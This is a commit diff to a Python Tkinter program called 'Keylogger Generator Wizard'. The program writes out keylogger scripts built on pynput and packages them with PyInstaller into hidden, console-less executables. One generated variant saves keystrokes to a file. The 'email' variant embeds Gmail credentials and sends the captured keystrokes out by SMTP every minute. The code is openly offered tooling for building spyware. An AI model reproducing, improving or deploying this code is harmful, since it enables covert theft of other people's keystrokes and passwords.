8820e025c55ca723cf78133ee820ae187de8b026
j4ckrisz <114130036+j4ckrisz@users.noreply.github.com>
2024-07-27 15:32:15 -0500

    Update test-main.py

--- test/test-main.py
+++ test/test-main.py
@@ -1,11 +1,13 @@
 import tkinter as tk
+from tkinter import ttk
 from tkinter import messagebox
 import subprocess
-import yaml
+from PIL import Image, ImageTk
 
 def save_input_email_keylogger():
     global entry_1, entry_2
     
+    # Get the input from the textboxes
     user_input_1 = entry_1.get()
     user_input_2 = entry_2.get()
     
@@ -16,28 +18,16 @@ def save_input_email_keylogger():
         saved_input_1 = user_input_1
         saved_input_2 = user_input_2
 
-        messagebox.showinfo("Creating Email", "The program is generating a keylogger for you :)")
-
-        # Save credentials to yaml file
-        credentials = {
-            'email': saved_input_1,
-            'password': saved_input_2
-        }
-        with open('credentials.yaml', 'w') as file:
-            yaml.dump(credentials, file)
-
+        # Generate keylogger script       
         with open('email-keylogger.py', 'w') as eKeylog:
-            eKeylog.write(f"""
-import smtplib
+
+            eKeylog.write("""import smtplib
 import time
 import yaml
 from pynput.keyboard import Listener
 
-with open('credentials.yaml', 'r') as file:
-    credentials = yaml.safe_load(file)
-
-email = credentials['email']
-password = credentials['password']
+email = '{}'
+password = '{}'
 
 log = ""
 
@@ -65,7 +55,11 @@ with Listener(on_press=on_press) as listener:
         time.sleep(60)
         send_log()
         listener.join()
-""")
+""".format(saved_input_1, saved_input_2))
+
+        messagebox.showinfo("Info", "The program has generated a script for you :) ")
+
+        convert_to_exe('email-keylogger.py')
 
     else:
         pass
@@ -73,29 +67,22 @@ with Listener(on_press=on_press) as listener:
 def on_button_click_email_keylogger():
     global entry_1, entry_2
 
-    tk.Label(root, text="Custom options for email Keylogger").pack(pady=10, padx=10)
     disable_other_buttons("email")
 
-    tk.Label(root, text="Type your gmail address").pack(pady=10)
-    entry_1 = tk.Entry(root)
-    entry_1.pack(pady=5)
+    tk.Label(root, text="Type your Gmail address", font=("Helvetica", 10), bg="#f0f0f0").place(relx=0.6, rely=0.3, anchor="center")
+    entry_1 = tk.Entry(root, width=30)
+    entry_1.place(relx=0.6, rely=0.4, anchor="center")
 
-    tk.Label(root, text="Enter your app-password").pack(pady=10)
-    entry_2 = tk.Entry(root)
-    entry_2.pack(pady=5)
+    tk.Label(root, text="Enter your app-password", font=("Helvetica", 10), bg="#f0f0f0").place(relx=0.6, rely=0.5, anchor="center")
+    entry_2 = tk.Entry(root, width=30)
+    entry_2.place(relx=0.6, rely=0.6, anchor="center")
 
-    save_button_email_keylogger = tk.Button(root, text="Next", command=save_input_email_keylogger)
-    save_button_email_keylogger.pack(pady=25)
+    save_button_email_keylogger = tk.Button(root, text="Generate", font=("Helvetica", 10), command=save_input_email_keylogger, bg="white", fg="black")
+    save_button_email_keylogger.place(relx=0.6, rely=0.7, anchor="center")
 
-    enable_buttons("end")
-
-def on_button_click_encrypted_connection():
-    tk.Label(root, text="Custom options for encrypted connection keylogger").pack(pady=10, padx=10) 
-    disable_other_buttons("encrypted")
-    enable_buttons("end")
 
 def on_button_click_simple_keylogger():
-    tk.Label(root, text="Custom options for simple Keylogger").pack(pady=10, padx=10)
+    
     disable_other_buttons("simple")
 
     with open('simple-keylogger.py', 'w') as SKeylog:
@@ -109,53 +96,59 @@ def writetofile(key):
 with Listener(on_press=writetofile) as l:
     l.join()
 """)
+        
+    messagebox.showinfo("Info", f" Simple keylogger has been successfully created !!")
 
     convert_to_exe('simple-keylogger.py')
     enable_buttons("end")
 
 def convert_to_exe(script_name):
+
     response = messagebox.askyesno("Convert to EXE", f"Do you want to convert {script_name} to an executable (EXE) file?")
     
     if response:
-        tk.Label(root, text="The script will be converted to an EXE file.").pack(pady=10, padx=10)
-        subprocess.run(['python', '-m', 'PyInstaller', '--onefile', script_name])
-        tk.Label(root, text="Your script has been converted to an exe file").pack(pady=10, padx=10)
-    
+        subprocess.run(['python', '-m', 'PyInstaller', '--onefile', '--noconsole', script_name])        
+        messagebox.showinfo("Info", f"{script_name} has been successfully converted to exe :) ")
+
     else:
-        tk.Label(root, text="The script will not be converted to an EXE file.").pack(pady=10, padx=10)
+        pass
 
 def disable_other_buttons(selected_button):
-    if selected_button != "simple":
+    if selected_button == "simple":
         keylogger_button_1.config(state="disabled")
-    if selected_button != "email":
+    if selected_button == "email":
         keylogger_button_2.config(state="disabled")
-    if selected_button != "encrypted":
-        keylogger_button_3.config(state="disabled")
 
 def enable_buttons(selected_button):
     if selected_button == "end":
         keylogger_button_1.config(state="normal")
         keylogger_button_2.config(state="normal")
-        keylogger_button_3.config(state="normal")
 
 # Init Tkinter
 root = tk.Tk()
 root.title("Keylogger Generator Wizard")
-root.geometry("620x700")
+root.geometry("600x400")
+root.resizable(width=False, height=False)
+
+# Load the background image
+bg_image = Image.open("bgimg.jpg")
+
+bg_image = bg_image.resize((600, 400), Image.LANCZOS)
+
+bg_photo = ImageTk.PhotoImage(bg_image)
+
+bg_label = tk.Label(root, image=bg_photo)
+bg_label.place(relwidth=1, relheight=1)
 
 # --- Keylogger Wizard Widgets --- 
-tk.Label(root, text="Keyloggers Generator Wizard").pack(pady=5, padx=5)
+tk.Label(root, text="Keylogger Generator Wizard", font=('Helvetica', 12), bg="#f0f0f0").place(relx=0.5, rely=0.1, anchor="center")
 
 # Simple Keylogger Widgets
-keylogger_button_1 = tk.Button(root, text="Simple Keylogger", command=on_button_click_simple_keylogger)
-keylogger_button_1.pack(pady=20)
+keylogger_button_1 = tk.Button(root, text="Simple Keylogger", font=('Helvetica', 10), command=on_button_click_simple_keylogger, bg="white", fg="black")
+keylogger_button_1.place(relx=0.3, rely=0.2, anchor="center")
 
 # Email Keylogger Widgets
-keylogger_button_2 = tk.Button(root, text="Email Keylogger", command=on_button_click_email_keylogger)
-keylogger_button_2.pack(pady=30)
-
-# Encrypted Keylogger Widgets 
-keylogger_button_3 = tk.Button(root, text="Encrypted Connection Keylogger", command=on_button_click_encrypted_connection)
-keylogger_button_3.pack(pady=40)
+keylogger_button_2 = tk.Button(root, text="Email Keylogger", font=('Helvetica', 10), command=on_button_click_email_keylogger, bg="white", fg="black")
+keylogger_button_2.place(relx=0.6, rely=0.2, anchor="center")
 
 root.mainloop()
